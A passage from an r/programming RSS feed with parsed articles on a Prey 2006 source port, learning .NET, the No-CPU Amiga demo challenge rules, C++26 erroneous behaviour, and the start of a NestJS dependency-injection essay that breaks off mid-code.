autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen title="How Your Code Really Controls Hardware"></iframe></section>]]></description><pubDate>Mon, 08 Sep 2025 01:34:39 +0530</pubDate></item><item><link>https://krispy-the-goat.itch.io/prey-2006</link><title>Prey 2006 project to create open-source FPS game port by integrating its codebase with Doom 3 GPL release (krispy-the-goat.itch.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nax3re/prey_2006_project_to_create_opensource_fps_game/</guid><comments>https://www.reddit.com/r/programming/comments/1nax3re/prey_2006_project_to_create_opensource_fps_game/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nax3re/prey_2006_project_to_create_opensource_fps_game/'>Post permalink</a></p></section><section class='preview-image'><img src='https://img.itch.zone/aW1nLzE4NzcxNzQ2LnBuZw==/original/fp8nmE.png' /></section><section class='parsed-content'><div><h4>Introduction</h4><p>This project is a code integration of the Prey 2006 SDK against the Doom 3 GPL codebase. This means this includes new engine side features that were in the Prey 2006 engine, and some adjustments to the Prey 2006 SDK code.</p><p>This runs in a semi vanilla&nbsp;<a href="https://github.com/dhewm/dhewm3/releases/tag/1.5.4">Dhewm3 v1.5.4</a> fork that specifically removes imgui, soft particles and joystick support for the time being.</p><h4>How To Run</h4><p>You <strong>MUST&nbsp;</strong>source your own legal copy of Prey (2006) to run this, i wouldn't provide any links for this.</p><h5>Why Release in a premature state?</h5><p>I'm releasing this build <strong><em>as-is with limit or lack thereof support</em></strong>, in hopes of attracting people that loves about this game and its, and since my lack of knowledge limits severely.</p><p>The source code of this project would be linked at the end of this but to summarize the current issues of this here are:</p><ol><li>Death Walk a key feature of Prey is missing meaning that in some parts you need to do noclip.</li><li>Spirit Walk visual are broken (in parts where spirit walking is mandatory noclip may or may not be needed)<br> </li><li>Multiplayer may work but has not been tested.<br> </li></ol> <h4>Credits</h4><p>This fork wouldn't be possible by the 3 previous attempts of porting Prey before me:</p><ul><li><a href="https://github.com/jmarshall23/PreyDoom">PreyDoom - By jmarshall23</a></li><li><a href="https://github.com/neitey/PreyVR">PreyVR - By neitey</a><br> </li><li><a href="https://github.com/glKarin/com.n0n3m4.diii4a">com.n0n3m4.diii4a - By GLKarin</a></li><li><a href="https://github.com/dhewm/dhewm3">dhewm3 - By dhew</a></li></ul> <h4>Conclusion</h4><p>Has i state before, here is the link for the&nbsp;&nbsp;<a href="https://github.com/FriskTheFallenHuman/Prey2006">Source Code</a>&nbsp;of this project, and here is the link for reporting&nbsp;<a href="https://github.com/FriskTheFallenHuman/Prey2006/issues">Issues</a> but like i say before support may or may not be limited.<span></span><br></p></div></section>]]></description><pubDate>Sun, 07 Sep 2025 21:35:18 +0530</pubDate></item><item><link>https://mijailovic.net/2025/09/07/dotnet/</link><title>How to (actually) become an expert in .NET (mijailovic.net)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nap35c/how_to_actually_become_an_expert_in_net/</guid><comments>https://www.reddit.com/r/programming/comments/1nap35c/how_to_actually_become_an_expert_in_net/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 12 min | <a href='https://www.reddit.com/r/programming/comments/1nap35c/how_to_actually_become_an_expert_in_net/'>Post permalink</a></p></section><section class='preview-image'><img src='https://mijailovic.net/assets/img/2025-09-07-dotnet.png' /></section><section class='parsed-content'><div><article><div><p>The influencers want you to think that you must learn a gazillion different technologies to become a successful .NET developer. These days, the internet is full of .NET &ldquo;roadmaps&rdquo; that include everything but the kitchen sink: Azure, AWS, Redis, Docker, Postgres, GraphQL, gRPC, Dapper, ELK stack, CQRS, you name it.</p><p>There are several problems with this trend. One is that it generates fear and anxiety that it&rsquo;s impossible to become a good developer, because the list of things you &ldquo;must&rdquo; know is growing by the day. It might also lead you to focus on the wrong things and waste the time you could spend <em>actually</em> improving your .NET skills. The other problem is that these claims are objectively wrong. I&rsquo;ve been using .NET for over 15 years, 6 of which I&rsquo;ve spent working for Microsoft, where I&rsquo;m currently a principal engineer. If I were to be judged by what influencers call minimal .NET knowledge, I wouldn&rsquo;t even qualify as a junior developer.</p><p>I&rsquo;m not being funny or anything, but shouldn&rsquo;t you learn Redis only if you, like, work with Redis? You don&rsquo;t have to learn GraphQL to be a good .NET developer, but you should absolutely learn how memory management works. Kafka and RabbitMQ are optional&mdash;knowing how async/await works is essential. Don&rsquo;t get me wrong: these are all cool technologies and it&rsquo;s great to be familiar with them. But most technologies can be easily learned when there is a real need. What truly matters is mastering the knowledge of .NET itself, and that&rsquo;s what this post is all about.</p><h2>How to read this guide</h2><p>I&rsquo;m going to share with you the list of resources that will help you to become a great .NET developer. Even though I tried to summarize only the essentials, it&rsquo;s still a lot of information. Mastering every area I&rsquo;m gonna talk about will take you months or even years, so don&rsquo;t get discouraged early on. It&rsquo;s impossible to learn everything immediately&mdash;what matters is expanding your expertise slowly, topic by topic.</p><p>You can learn the topics I presented in any order. For example, if your job requires you to write high-performance code, you could start your learning journey by focusing on the performance and tools sections. Or if you want to broaden your C# knowledge first, you could start with <em>C# learning resources</em>. If you are not sure, <em>Exploring .NET internals</em> is the best place to get started.</p><p>Before we start: if you are an absolute .NET beginner, this post is probably not for you. If you want to learn C#, I recommend watching the <a href="https://www.youtube.com/playlist?list=PLdo4fOcmZ0oULFjxrOagaERVAMbmG20Xe">C# for Beginners</a> YouTube video course first. Now let&rsquo;s get started.</p><h2>Books</h2><p>If you had asked me ten years ago what&rsquo;s the best way to learn .NET, I would have probably told you to read CLR via C#. Although it&rsquo;s still one of my favorite technical books ever, .NET has changed so much since the book came out that I can no longer recommend it as the most efficient way to master .NET. In fact, I think that the quality of technical books has been decreasing over the years, so there are fewer and fewer books that I would consider must-reads.</p><p>Having said that, if you like reading books, there are still some excellent ones out there! If I had to recommend only one .NET book, it would be <a href="https://www.ebooks.com/en-cz/book/210046474/framework-design-guidelines/krzysztof-cwalina/">Framework Design Guidelines</a>. Written by .NET architects, it&rsquo;s a collection of conventions and best practices for writing idiomatic .NET code. What elevates this book from the rest is that it&rsquo;s full of comments and annotations from .NET legends such as Jeffrey Richter, Joe Duffy, Rico Mariani, and Vance Morrison, in which they explain not only the best practices, but also the reasoning behind them.</p><p>Another book I loved is <a href="https://www.writinghighperf.net/">Writing High-Performance .NET Code</a>. When it came out in 2018, it was the most comprehensive guide to .NET performance. The only thing that&rsquo;s holding me back from giving it my seal of approval now is that I haven&rsquo;t re-read it since, so I&rsquo;m not sure if it still holds up today (my guess is that it&rsquo;s still relevant).</p><h2>Exploring .NET internals</h2><p>I think the key to becoming a .NET expert is learning how things work under the hood. Gaining a deep understanding of async/await, string interpolation, spans, and garbage collection will give you superpowers and help you stand out from the crowd. The .NET team regularly publishes deep dives on their blog (well, it&rsquo;s just Stephen Toub in most cases), and they are great, without exception. Here are the ones I consider the most important:</p><ul> <li><a href="https://devblogs.microsoft.com/dotnet/how-async-await-really-works/">How Async/Await Really Works in C#</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/string-interpolation-in-c-10-and-net-6/">String Interpolation in C# 10 and .NET 6</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/configureawait-faq/">ConfigureAwait FAQ</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/an-introduction-to-system-threading-channels/">An Introduction to System.Threading.Channels</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/understanding-the-whys-whats-and-whens-of-valuetask/">Understanding the Whys, Whats, and Whens of ValueTask</a></li> <li><a href="https://learn.microsoft.com/en-us/archive/msdn-magazine/2018/january/csharp-all-about-span-exploring-a-new-net-mainstay">All About Span: Exploring a New .NET Mainstay</a></li> </ul><p>If you prefer watching videos, <a href="https://www.youtube.com/playlist?list=PLdo4fOcmZ0oX8eqDkSw4hH9cSehrGgdr1">Deep .NET</a> is hands down the best collection of .NET deep dives on the internet. These videos cover the same topics as the blog posts I mentioned and even more, so they are definitely worth your time.</p><h2>C# learning resources</h2><p>Assuming you already know the basics of C#, progressing further is fairly straightforward. Whether you want to learn about the new C# features or just fill the gaps in your knowledge, you should check out the following pages:</p><ul> <li><a href="https://learn.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-14">What&rsquo;s new in C# 14</a></li> <li><a href="https://learn.microsoft.com/en-us/dotnet/core/whats-new/dotnet-10/overview">What&rsquo;s new in .NET 10</a></li> </ul><p>These two articles describe the new features in the latest versions of C# and .NET, but I also recommend reading about all previous versions. Even if you are an experienced .NET developer, I think you will still learn something new.</p><h2>Staying up to date</h2><p>First of all, you don&rsquo;t need to know about every new runtime or language feature. You&rsquo;ll be perfectly fine even if you don&rsquo;t start using <code>readonly ref struct</code>, record types, or pattern matching right away. But I would still advise you to periodically check what&rsquo;s been going on in the .NET ecosystem. It&rsquo;s not necessary to do this on a weekly or even a monthly basis&mdash;doing this once a year should be more than enough.</p><p>Your main source of information should be the <a href="https://devblogs.microsoft.com/dotnet/">.NET blog</a> (other blogs often cherry-pick random pieces of information from official .NET posts). Not everything on the .NET blog is required reading, though. For me, the most illuminating posts are the ones that showcase the improvements in the latest .NET versions. My personal highlights are the following series:</p><ul> <li><a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/">Performance Improvements in .NET 9</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/dotnet-9-networking-improvements/">.NET 9 Networking Improvements</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/system-text-json-in-dotnet-9/">What&rsquo;s new in System.Text.Json in .NET 9</a></li> <li><a href="https://devblogs.microsoft.com/dotnet/file-io-improvements-in-dotnet-6/">File IO improvements in .NET 6</a></li> </ul><p>These are just the latest posts in the series&mdash;if you like them, I highly recommend reading the earlier posts in the series as well.</p><h2>Mastering the key libraries</h2><p>To be an effective .NET developer, it&rsquo;s more important to be proficient with the standard library than to be familiar with any specific external library. It&rsquo;s definitely worth learning the modern APIs for <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/system-text-json/overview">JSON serialization and deserialization</a>. Learning how to use the HttpClient correctly is also essential&mdash;it seems obvious, but it&rsquo;s surprisingly tricky to get right. Here are my recommended articles about writing reliable networking code and avoiding common pitfalls:</p><ul> <li><a href="https://learn.microsoft.com/en-us/dotnet/fundamentals/networking/http/httpclient-guidelines">Guidelines for using HttpClient</a></li> <li><a href="https://learn.microsoft.com/en-us/dotnet/core/extensions/httpclient-factory">IHttpClientFactory with .NET</a></li> <li><a href="https://learn.microsoft.com/en-us/dotnet/core/resilience/http-resilience">Build resilient HTTP apps: Key development patterns</a></li> </ul><p>Outside the standard library, Newtonsoft.Json is still so widely used that it&rsquo;s very useful to at least know how to use it optimally <a href="https://www.newtonsoft.com/json/help/html/performance.htm">for performance</a>.</p><h2>Writing high-performance code</h2><p>Modern .NET is incredibly fast. In fact, I would say that high performance is one of its defining characteristics, so it pays off to understand how to take full advantage of the platform&rsquo;s high-performance features.</p><p>Stephen Toub&rsquo;s annual blog posts on <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/">performance improvements in .NET</a> are among the most valuable resources for learning about .NET performance. Although they are published as blog posts, they really are books in disguise&mdash;the latest installment is more than 300 pages long. Unless you have unlimited free time, reading them end-to-end is next to impossible. My recommended way of consuming these posts is to scan through the topics and carefully read sections that pique your curiosity. What does that mean? If you are a compiler optimization geek, you might want to read sections about the latest JIT and PGO improvements. But if you are looking for practical knowledge you can apply immediately in your backend service, you could read sections about JSON and networking improvements.</p><p>Writing the fastest possible .NET code requires understanding how garbage collection works. The official documentation on <a href="https://learn.microsoft.com/en-us/dotnet/standard/garbage-collection/">garbage collection</a> is great: it&rsquo;s easy to read and very thorough. It will teach you how generations work, what is the large object heap, what are the differences between workstation and server garbage collection, and much more. But the definitive resource for mastering memory in .NET is the <a href="https://github.com/Maoni0/mem-doc/blob/master/doc/.NETMemoryPerformanceAnalysis.md">.NET Memory Performance Analysis</a> document written by Maoni Stephens, the .NET GC architect. It&rsquo;s the ultimate guide on how to approach memory performance analysis, and one of the best ways to deepen your understanding of how memory works in .NET.</p><p>Finally, it&rsquo;s important to learn how to measure performance correctly. <a href="https://benchmarkdotnet.org/">BenchmarkDotNet</a> is the undisputed king of .NET benchmarking and one of the few libraries everyone should be using. However, knowing how to use BenchmarkDotNet is just half of the story. Writing good benchmarks is not trivial and you can easily end up measuring the wrong thing. That&rsquo;s where the .NET team&rsquo;s <a href="https://github.com/dotnet/performance/blob/main/docs/microbenchmark-design-guidelines.md">Microbenchmark Design Guidelines</a> come into play. Think of this document as the missing BenchmarkDotNet manual&mdash;it goes beyond the syntax and teaches you how to design your benchmarks the right way. The <a href="https://github.com/dotnet/performance">.NET Performance</a> GitHub repository also contains all benchmarks for the .NET standard library. If you ever need inspiration when designing benchmarks, it&rsquo;s the best place to start.</p><p>I think everyone should have a decompiler in their toolbox. It&rsquo;s useful not only for reverse engineering, but also if you want to learn how seemingly simple statements like string interpolation work under the hood. The choice of decompiler is up to you&mdash;I personally prefer <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>.</p><p>One more indispensable tool is the <a href="https://source.dot.net/">.NET Source Browser</a>. I often use it to inspect how .NET classes are implemented and to find examples of good code design patterns. Even though the .NET source code is available in the <a href="https://github.com/dotnet/runtime">.NET Runtime</a> GitHub repository, the source browser makes navigation much easier.</p><p>.NET Framework&rsquo;s tooling was pretty bare-bones. In contrast, .NET Core comes with some fantastic <a href="https://learn.microsoft.com/en-us/dotnet/core/diagnostics/tools-overview">diagnostic tools</a>. You most likely won&rsquo;t use all of them in your day-to-day work, but in the right circumstances, they can be incredibly handy. At the very least, you should be aware of which tools exist. That way, if you ever need to collect a memory dump, you&rsquo;ll know you can use <a href="https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-dump">dotnet-dump</a>. Or if you need to debug runaway threads, <a href="https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-stack">dotnet-stack</a> can capture the stacks of all threads in a .NET process.</p><h2>Conclusion</h2><p>I hope this post was not too overwhelming! But my main message is simple: focus on having rock-solid fundamentals and you&rsquo;ll be golden. Hopefully, you also discovered some new and interesting learning resources. Let me know if I missed anything you consider essential!</p></div></article> </div></section>]]></description><pubDate>Sun, 07 Sep 2025 15:13:57 +0530</pubDate></item><item><link>https://github.com/askeksa/NoCpuChallenge</link><title>The No-CPU Amiga Demo Challenge (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1namo4q/the_nocpu_amiga_demo_challenge/</guid><comments>https://www.reddit.com/r/programming/comments/1namo4q/the_nocpu_amiga_demo_challenge/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1namo4q/the_nocpu_amiga_demo_challenge/'>Post permalink</a></p></section><section class='preview-image'><img src='https://opengraph.githubassets.com/00e4db5f825b16def79a43fd1c69a1386894629132ee3b573872491357d04977/askeksa/NoCpuChallenge' /></section><section class='parsed-content'><div><article><h2>The No-CPU Amiga Demo Challenge</h2><a href="https://github.com#the-no-cpu-amiga-demo-challenge"></a><p>This is an open challenge to create demos that run entirely on the Amiga custom chips without involving the CPU.</p><p>This repository contains the rules of the challenge and a <a href="https://github.com/askeksa/NoCpuChallenge/blob/main/runner">runner</a> application for launching no-CPU demos. This is intended as a standard specification of the no-CPU platform for demo competitions.</p><p>There will be a dedicated no-CPU Amiga demo competition at <a href="https://gerp.nu/"><strong>Gerp 2026</strong></a>, January 23-25, 2026. In addition, this is an ongoing challenge &mdash; an invitation to explore a different kind of demo platform.</p><p>An <a href="https://www.pouet.net/prod.php?which=104753">invitation demo</a> &mdash; itself a no-CPU demo &mdash; was released at <strong>Evoke 2025</strong>. The full source code for the demo is available <a href="https://github.com/askeksa/NoCpuDemo">here</a>.</p><p>Whenever you release a no-CPU demo, you are encouraged to write a comment about it on the <a href="https://github.com/askeksa/NoCpuChallenge/issues/1">demo announcement issue</a>.</p><p>There's also a <a href="https://github.com/askeksa/NoCpuChallenge/blob/main/faq.md">FAQ</a>.</p><h2>Background</h2><a href="https://github.com#background"></a><p>The Amiga custom chips (affectionately named <strong>Alice</strong>, <strong>Lisa</strong> and <strong>Paula</strong> in the AGA version of the chipset) were remarkably powerful for their time, enabling the Amiga computers &mdash; with their modestly-powered CPUs &mdash; to perform graphical and musical feats that required heavy computation on most contemporary platforms.</p><p>This challenge aims to discover just how powerful these chips really are by exploring what they can do completely on their own, without the CPU even telling them what to do.</p><p>There have been several demo competitions in the past with a technical theme. Examples include <a href="https://sommarhack.se/2024/compo.php#themed1">Atari zero bitplane</a>, <a href="https://sommarhack.se/2025/compo.php#themed">Atari mixed-resolution</a>, <a href="https://csdb.dk/event/?id=3003">C64 only sprites</a> and <a href="https://csdb.dk/event/?id=3021">C64 border only</a>. This is a similar idea for the Amiga &mdash; no CPU, custom chips only.</p><h2>Technical details</h2><a href="https://github.com#technical-details"></a><p>A no-CPU demo takes the form of a raw memory image that specifies the initial contents of chip memory. Together with the initial state of the hardware registers (specified below) this memory image fully defines the demo.</p><p>The memory image is loaded into memory by a <a href="https://github.com/askeksa/NoCpuChallenge/blob/main/runner">runner</a> application, which serves as the demo executable. You can use the runner as is or modify it to your liking, but in order to qualify as a no-CPU demo according to this challenge, your chip memory image has to work with the official runner (with the same behavior).</p><p>The maximum size of the chip memory image depends on the targeted Amiga chipset: 512k for OCS, 1MB for ECS (or OCS with ECS Agnus and 512k expansion, <a href="https://eab.abime.net/showthread.php?t=120351&amp;page=2">likely</a> the most common Amiga 500 configuration), and 2MB for AGA.</p><p>The audio filter is disabled. Since the filter is controlled via the CIA registers, which the copper does not have access to, the demo does not have the option of enabling the filter.</p><p>The initial hardware register contents are as follows. Registers with ECS/AGA specific bits are generally initialized to their OCS defaults. This makes it easier to make a demo targeting OCS without worrying about AGA compatibility (as long as you are not using incompatible features, such as the 7 bitplane trick).</p><markdown-accessiblity-table><table> <thead> <tr> <th>Register</th> <th>Address</th> <th>Value</th> <th>Comment</th> </tr> </thead> <tbody> <tr> <td>VPOSW</td> <td><code>$dff02a</code></td> <td><code>$8000</code></td> <td>Long frames</td> </tr> <tr> <td>COPCON</td> <td><code>$dff02e</code></td> <td><code>$0002</code></td> <td>Copper danger flag set</td> </tr> <tr> <td>COP1LC</td> <td><code>$dff080</code></td> <td><code>$000000</code></td> <td>Copper initially starts at address 0</td> </tr> <tr> <td>DMACON</td> <td><code>$dff096</code></td> <td><code>$87c0</code></td> <td>Bitplane, copper and blitter DMA enabled, sprite DMA disabled, Blitter Nasty set</td> </tr> <tr> <td>ADKCON</td> <td><code>$dff09e</code></td> <td><code>$xx00</code></td> <td>All modulation disabled</td> </tr> <tr> <td>BPLCON0</td> <td><code>$dff100</code></td> <td><code>$0200</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON1</td> <td><code>$dff102</code></td> <td><code>$0000</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON2</td> <td><code>$dff104</code></td> <td><code>$0024</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON3</td> <td><code>$dff106</code></td> <td><code>$0c00</code></td> <td>OCS default</td> </tr> <tr> <td>BPLCON4</td> <td><code>$dff10c</code></td> <td><code>$0011</code></td> <td>OCS default</td> </tr> <tr> <td>COLOR00</td> <td><code>$dff180</code></td> <td><code>$000</code></td> <td>Black background</td> </tr> <tr> <td>BEAMCON0</td> <td><code>$dff1dc</code></td> <td><code>$0020</code></td> <td>PAL</td> </tr> <tr> <td>FMODE</td> <td><code>$dff1fc</code></td> <td><code>$0000</code></td> <td>OCS default</td> </tr> </tbody> </table></markdown-accessiblity-table><p>The values of all other registers are undefined.</p><p>The demo can signal that it has ended by clearing the Blitter Nasty flag (i.e. by executing the copper instruction $0096,$0400). Depending on the hardware configuration, the runner may not actually be able to exit back to the OS, so the demo should still maintain a valid display.</p><h2>Feedback</h2><a href="https://github.com#feedback"></a><p>If you have questions or comments, you are welcome to <a href="https://github.com/askeksa/NoCpuChallenge/issues/new">open an issue</a>. I am particularly interested in feedback in these areas:</p><ul> <li>If there is something in the rules or the runner that you think puts undue limits on what no-CPU demos can do under this formalism.</li> <li>If you find a security hole in the runner sandbox, enabling a demo to reactivate the CPU.</li> </ul> </article></div></section>]]></description><pubDate>Sun, 07 Sep 2025 12:38:09 +0530</pubDate></item><item><link>https://www.sandordargo.com/blog/2025/02/05/cpp26-erroneous-behaviour</link><title>C++26: Erroneous Behaviour (sandordargo.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nag97e/c26_erroneous_behaviour/</guid><comments>https://www.reddit.com/r/programming/comments/1nag97e/c26_erroneous_behaviour/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 7 min | <a href='https://www.reddit.com/r/programming/comments/1nag97e/c26_erroneous_behaviour/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>If you pick a random talk at a C++ conference these days, there is a fair chance that the speaker will mention safety at least a couple of times. It&rsquo;s probably fine like that. The committee and the community must think about improving both the safety situation and the reputation of C++.</p><p>If you follow what&rsquo;s going on in this space, you are probably aware that people have different perspectives on safety. I think almost everybody finds it important, but they would solve the problem in their own way.</p><p>A big source of issues is certain manifestations of undefined behaviour. It affects both the safety and the stability of software. I remember that a few years ago when I was working on some services which had to support a 10x growth, one of the important points was to eliminate undefined behaviour as much as possible. One main point for us was to remove uninitialized variables which often lead to crashing services.</p><p>Thanks to <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2024/p2795r5.html">P2795R5</a> by Thomas K&ouml;ppe, uninitialized reads won&rsquo;t be undefined behaviour anymore - starting from C++26. Instead, they will get a new behaviour called &ldquo;erroneous behaviour&rdquo;.</p><p>The great advantage of erroneous behaviour is that it will work just by recompiling existing code. It will diagnose where you forgot to initialize variables. You don&rsquo;t have to systematically go through your code and let&rsquo;s say declare everything as <code>auto</code> to make sure that every variable has an initialized value. Which you probably wouldn&rsquo;t do anyway.</p><p>But what is this new behaviour that on C++ Reference is even listed <a href="https://en.cppreference.com/w/cpp/language/ub">on the page of undefined behaviour</a>? It&rsquo;s well-defined, yet incorrect behaviour that compilers are <strong>recommended</strong> to diagnose. <em>Is recommended enough?!</em> Well, with the growing focus on safety, you can rest assured that an implementation that wouldn&rsquo;t diagnose erroneous behaviour would be soon out of the game.</p><p>Some compilers can already identify uninitialized reads - what nowadays falls under undefined behaviour. For example, clang and gcc with <code>-ftrivial-auto-var-init=zero</code> have already offered default initialization of variables with automatic storage duration. This means that the technique to identify these variables is already there. The only thing that makes this approach not practical is that you will not know which variables you failed to initialize.</p><p>Instead of default initialization, with erroneous behaviour, an uninitialized object will be initialized to an implementation-specific value. Reading such a value is a conceptual error that is recommended and encouraged to be diagnosed by the compiler. That might happen through warnings, run-time errors, etc.</p><div><p><code><table><tbody><tr><td><pre>1 2 3 4 </pre></td><td><pre><span>void</span> <span>foo</span><span>()</span> <span>{</span> <span>int</span> <span>d</span><span>;</span> <span>// d has an erroneous value</span> <span>bar</span><span>(</span><span>d</span><span>);</span> <span>// that's erroneous behaviour!</span> <span>}</span> </pre></td></tr></tbody></table></code></p></div><p>So looking at the above example, ideally <code>int d;</code> should be already diagnosed at compile-time as a warning. If it&rsquo;s ignored, at some point, <code>bar(d);</code> will have an effect during program execution, but it should be well-defined, unlike undefined behaviour where anything can happen.</p><blockquote><p>It&rsquo;s worth noting that undefined behaviour and having erroneous values is not possible in constant expressions. In other words, <code>constexpr</code> protects from it.</p></blockquote><p>Initializing an object to anything has a cost. What if you really want to avoid it and initialize the object later? Will you be able to still do it without getting the diagnostics? Sure! You just have to be deliberate about that. You cannot just leave values uninitialized by accident, you must mark them with C++26&rsquo;s new attribute, <code>[[indeterminiate]]</code>.</p><div><p><code><table><tbody><tr><td><pre>1 2 3 4 </pre></td><td><pre><span>void</span> <span>foo</span><span>()</span> <span>{</span> <span>int</span> <span>d</span> <span>[[</span><span>indeterminate</span><span>]];</span> <span>// d has an indeterminate value</span> <span>bar</span><span>(</span><span>d</span><span>);</span> <span>// that's undefined behaviour!</span> <span>}</span> </pre></td></tr></tbody></table></code></p></div><p>We must notice in the example, that <code>d</code> doesn&rsquo;t have an erroneous value anymore. Now its value is simply <a href="https://en.cppreference.com/w/cpp/language/attributes/indeterminate">indeterminate</a>. On the other hand, if we later use that variable still without initialization, it&rsquo;s undefined behaviour!</p><p>Above, we&rsquo;ve only talked about variables with automatic storage duration. That&rsquo;s not the only way to have uninitialized variables. Moreover, probably it&rsquo;s not even the main way, think about dynamic storage duration, think about pointers! Also, if any member is left uninitialized, the parent object&rsquo;s value will be considered either indeterminate or erroneous.</p><div><p><code><table><tbody><tr><td><pre>1 2 3 4 5 6 7 8 9 10 11 12 </pre></td><td><pre><span>struct</span> <span>S</span> <span>{</span> <span>S</span><span>()</span> <span>{}</span> <span>int</span> <span>num</span><span>;</span> <span>std</span><span>::</span><span>string</span> <span>text</span><span>;</span> <span>};</span> <span>int</span> <span>main</span><span>()</span> <span>{</span> <span>[[</span><span>indeterminate</span><span>]]</span> <span>S</span> <span>s1</span><span>;</span> <span>// indeterminate value</span> <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>s1</span><span>.</span><span>num</span> <span>&lt;&lt;</span> <span>'\n'</span> <span>// this is UB as s1.num is indeterminate</span> <span>S</span> <span>s2</span><span>;</span> <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>s2</span><span>.</span><span>num</span> <span>&lt;&lt;</span> <span>'\n'</span> <span>// this is still UB, s2.num is an erroneous value</span> <span>}</span> </pre></td></tr></tbody></table></code></p></div><p>Not only variables variables but function parameters can also be marked <code>[[indeterminate]]</code>.</p><div><p><code><table><tbody><tr><td><pre>1 2 3 4 5 6 7 8 9 10 11 </pre></td><td><pre><span>struct</span> <span>S</span> <span>{</span> <span>S</span><span>()</span> <span>{}</span> <span>int</span> <span>num</span><span>;</span> <span>std</span><span>::</span><span>string</span> <span>text</span><span>;</span> <span>};</span> <span>void</span> <span>foo</span><span>(</span><span>S</span> <span>s1</span> <span>[[</span><span>indeterminate</span><span>]],</span> <span>S</span> <span>s2</span><span>)</span> <span>{</span> <span>bar</span><span>(</span><span>s1</span><span>.</span><span>num</span><span>);</span> <span>// undefined behavior</span> <span>bar</span><span>(</span><span>s2</span><span>.</span><span>num</span><span>);</span> <span>// erroneous behavior</span> <span>}</span> </pre></td></tr></tbody></table></code></p></div><p>At the point of writing (January 2025), no compiler provides support for erroneous behaviour.</p><h2>Conclusion</h2><p>C++26 introduces erroneous behaviour in order to give well-defined, but incorrect behaviour for reading uninitialized values. Soon, compilers will be recommended to diagnose every occurrence of reads of uninitialized variables and function parameters.</p><p>Also, if something is not initialized at a given moment on purpose, you can mark it with the <code>[[indeterminate]]</code> attribute following the don&rsquo;t pay for what you don&rsquo;t need principle.</p><p>This new behaviour is a nice step forward in terms of C++&rsquo;s safety.</p><h2>Connect deeper</h2><p>If you liked this article, please</p><ul><li>hit on the like button,</li><li><a href="http://eepurl.com/gvcv1j">subscribe to my newsletter</a></li></ul></div><div class="gallery"><p><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png"></p></div></section>]]></description><pubDate>Sun, 07 Sep 2025 06:43:43 +0530</pubDate></item><item><link>https://fastcode.io/2025/09/07/when-does-framework-sophistication-becomes-a-liability/</link><title>When Does Framework Sophistication Becomes a Liability? (fastcode.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1na87fy/when_does_framework_sophistication_becomes_a/</guid><comments>https://www.reddit.com/r/programming/comments/1na87fy/when_does_framework_sophistication_becomes_a/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 36 min | <a href='https://www.reddit.com/r/programming/comments/1na87fy/when_does_framework_sophistication_becomes_a/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>How a 72-hour debugging nightmare revealed the fundamental flaw in dependency injection frameworks and why strict typing matters more than sophisticated abstractions</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://i0.wp.com/fastcode.io/wp-content/uploads/2025/09/debugging-nestjs-8003867.png?fit=1200%2C675&ssl=1' /></section><section class='parsed-content'><div><p>How a 72-hour debugging nightmare revealed the fundamental flaw in dependency injection frameworks and why strict typing matters more than sophisticated abstractions</p><h2>The Promise vs. The Reality</h2><p>TypeScript sold us a dream: JavaScript&rsquo;s flexibility with compile-time safety. NestJS took that dream further: enterprise patterns with type checking. For backend development, this seemed like the perfect combination, until a simple refactoring turned into a multi-day debugging marathon that exposed the fundamental contradiction at the heart of modern Node.js development.</p><p>The story begins with what should have been a straightforward task: refactor our notification system to route messages through a gateway instead of calling external APIs directly. Classic enterprise architecture, improve separation of concerns, centralize integrations, make everything more testable.</p><p>What followed was 72 hours of dependency injection archaeology, token naming inconsistencies, mock configuration hell, and ultimately discovering that a perfectly typed, fully tested, 93% code coverage system was completely broken in production.</p><p>This isn&rsquo;t just another &ldquo;framework bashing&rdquo; story. This is about a fundamental architectural mismatch between the tools we choose and the problems we&rsquo;re actually trying to solve. It&rsquo;s about how TypeScript&rsquo;s safety guarantees systematically break down in dependency injection frameworks, and why the choice between flexibility and correctness matters more than we admit.</p><h2>Day 1: The Dependency Injection Type Safety Illusion</h2><p>The refactoring started innocently enough. Our original notification service was beautifully simple:</p><div><pre><code><span><span>@</span><span>Injectable</span><span>()</span></span> <span><span>class</span><span>NotificationService</span><span> {</span></span> <span><span>constructor</span><span>(</span></span> <span><span> 